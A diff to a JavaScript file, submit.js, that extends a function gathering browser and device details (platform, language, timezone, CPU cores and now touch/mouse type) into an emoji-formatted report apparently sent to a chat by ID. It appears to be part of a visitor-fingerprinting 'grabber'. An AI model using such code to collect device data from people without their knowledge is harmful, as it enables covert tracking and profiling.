@@ -1,4 +1,4 @@
-// submit.js (updated: Network type + Adblock cookies + headings)
+// submit.js (updated: Touch/Mouse detection in Basic Info)
 
 async function collectAndSend(chatId) {
   if (!chatId) {
@@ -25,6 +25,18 @@ async function collectAndSend(chatId) {
   const platform = safe(() => navigator.platform || (navigator.userAgentData && navigator.userAgentData.platform), 'Unknown');
   const language = safe(() => navigator.language || (navigator.languages && navigator.languages[0]), 'Unknown');
   const timezone = safe(() => Intl.DateTimeFormat().resolvedOptions().timeZone, 'Unknown');
+
+  // Touch / Mouse detection
+  function getTouchMouseType() {
+    const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+    const hasMouse = window.matchMedia('(pointer: fine)').matches;
+
+    if (hasTouch && hasMouse) return 'Both';
+    if (hasTouch) return 'Touch';
+    if (hasMouse) return 'Mouse';
+    return 'Unknown';
+  }
+  const touchMouse = getTouchMouseType();
 
   // Hardware
   const cpuCores = safe(() => navigator.hardwareConcurrency, 'Unknown');
@@ -154,6 +166,7 @@ async function collectAndSend(chatId) {
 - Platform: ${platform}
 - Language: ${language}
 - Timezone: ${timezone}
+- Touch/Mouse: ${touchMouse}
 
 💻 Hardware:
 - CPU: ${cpuCores} cores
